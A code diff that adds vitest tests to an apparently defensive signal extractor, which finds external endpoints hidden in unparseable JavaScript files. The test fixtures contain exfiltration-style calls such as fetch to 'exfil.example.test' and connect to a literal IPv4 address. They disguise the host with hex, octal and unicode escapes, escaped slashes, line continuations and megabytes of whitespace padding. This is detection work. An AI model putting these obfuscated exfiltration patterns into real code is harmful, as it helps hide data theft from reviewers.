@@ -1,4 +1,5 @@
 import { describe, expect, it } from "vitest";
+import { diffSignals } from "./signal-differ.js";
 import {
   MIN_OBFUSCATION_ARRAY_ELEMENTS,
   type SignalSourceInput,
@@ -377,6 +378,195 @@ describe("signal extractor", () => {
         }).endpoints,
       ).toEqual([]);
     });
+  });
+
+  describe("escaped values in unparseable files", () => {
+    it("finds a URL behind a glued hex escape", () => {
+      const result = buildSignalSet([
+        source(
+          "index.js",
+          'fetch("\\x20https://exfil.example.test/x");',
+          "unparseable",
+        ),
+      ]);
+
+      expect(
+        result.endpoints.map((item) => [
+          item.endpointType,
+          item.normalizedValue,
+        ]),
+      ).toEqual([["domain", "exfil.example.test"]]);
+    });
+
+    it("finds an IPv4 address with an escaped dot", () => {
+      const result = buildSignalSet([
+        source("index.js", 'connect(443, "93.184.216\\x2e34");', "unparseable"),
+      ]);
+
+      expect(
+        result.endpoints.map((item) => [
+          item.endpointType,
+          item.normalizedValue,
+        ]),
+      ).toEqual([["ipv4", "93.184.216.34"]]);
+    });
+
+    it("finds an IPv4 address with a legacy octal escape", () => {
+      const result = buildSignalSet([
+        source("index.js", 'connect(443, "93.184.216\\05634");', "unparseable"),
+      ]);
+
+      expect(
+        result.endpoints.map((item) => [
+          item.endpointType,
+          item.normalizedValue,
+        ]),
+      ).toEqual([["ipv4", "93.184.216.34"]]);
+    });
+
+    it("finds a URL written with escaped slashes", () => {
+      const result = buildSignalSet([
+        source(
+          "index.js",
+          'fetch("https:\\/\\/exfil.example.test");',
+          "unparseable",
+        ),
+      ]);
+
+      expect(result.endpoints.map((item) => item.normalizedValue)).toEqual([
+        "exfil.example.test",
+      ]);
+    });
+
+    it("finds a URL after a code point escape with many leading zeros", () => {
+      const result = buildSignalSet([
+        source(
+          "index.js",
+          'fetch("\\u{00000000000000000000000068}ttps://exfil.example.test/x");',
+          "unparseable",
+        ),
+      ]);
+
+      expect(result.endpoints.map((item) => item.normalizedValue)).toEqual([
+        "exfil.example.test",
+      ]);
+    });
+
+    it("removes a line continuation before scanning", () => {
+      const result = buildSignalSet([
+        source(
+          "index.js",
+          'fetch("https:\\\n//exfil.example.test/x");',
+          "unparseable",
+        ),
+      ]);
+
+      expect(result.endpoints.map((item) => item.normalizedValue)).toEqual([
+        "exfil.example.test",
+      ]);
+    });
+
+    it("does not report a plain URL twice", () => {
+      const result = buildSignalSet([
+        source(
+          "index.js",
+          'const pad = "\\x41";\nfetch("https://plain.example.test/x");',
+          "unparseable",
+        ),
+      ]);
+
+      expect(result.endpoints).toHaveLength(1);
+      expect(result.endpoints[0]?.evidence).toHaveLength(1);
+    });
+
+    it("locates the match on the source line of the escape", () => {
+      const result = buildSignalSet([
+        source(
+          "index.js",
+          [
+            'const a = "\\x41";',
+            'const b = "\\u0020";',
+            'fetch("\\x20https://exfil.example.test/x");',
+          ].join("\n"),
+          "unparseable",
+        ),
+      ]);
+
+      expect(result.endpoints[0]?.evidence[0]?.line).toBe(3);
+    });
+
+    it("scans 2 MB of hex escapes in linear time", () => {
+      const text = "\\x41".repeat(524_288);
+
+      const started = performance.now();
+      buildSignalSet([source("index.js", text, "unparseable")]);
+
+      expect(performance.now() - started).toBeLessThan(3_000);
+    });
+  });
+
+  describe("provenance of widened observations (ADR-037)", () => {
+    const rejected = (file: string, text: string) =>
+      observeSignalSource({
+        file,
+        bytes: new TextEncoder().encode(text),
+        parseState: "unparseable",
+      });
+
+    it("tags a decoded-only endpoint additive", () => {
+      const result = buildSignalSet([
+        source(
+          "index.js",
+          'fetch("https:\\/\\/exfil.example.test");',
+          "unparseable",
+        ),
+      ]);
+
+      expect(result.endpoints).toEqual([
+        expect.objectContaining({
+          normalizedValue: "exfil.example.test",
+          provenance: "additive",
+        }),
+      ]);
+    });
+
+    it("reports a new host when a padded old file only mentions it behind an escape", () => {
+      const padded =
+        "/* https:\\/\\/exfil.example.test */" + " ".repeat(2 * 1024 * 1024);
+      const oldSet = buildSignalSet([rejected("old.js", padded)]);
+      const newSet = buildSignalSet([
+        source("new.js", 'fetch("https://exfil.example.test/x");'),
+      ]);
+
+      expect(oldSet.endpoints[0]?.provenance).toBe("additive");
+      expect(diffSignals(oldSet, newSet)).toContainEqual(
+        expect.objectContaining({
+          kind: "new-external-endpoint",
+          detail: "new external domain exfil.example.test",
+        }),
+      );
+    });
+
+    it("appends a large rejected file's decoded observations without argument spreading", () => {
+      const text = "::2 ".repeat(524_287) + "\\x20";
+
+      expect(() => buildSignalSet([rejected("old.js", text)])).not.toThrow();
+    }, 20_000);
+
+    it("reports a new host when the old side is a large rejected file", () => {
+      const text = "::2 ".repeat(524_287) + "\\x20";
+      const oldSet = buildSignalSet([rejected("old.js", text)]);
+      const newSet = buildSignalSet([
+        source("new.js", 'fetch("https://exfil.example.test/x");'),
+      ]);
+
+      expect(diffSignals(oldSet, newSet)).toContainEqual(
+        expect.objectContaining({
+          kind: "new-external-endpoint",
+          detail: "new external domain exfil.example.test",
+        }),
+      );
+    }, 20_000);
   });
 
   describe("cooked string values (ADR-026)", () => {
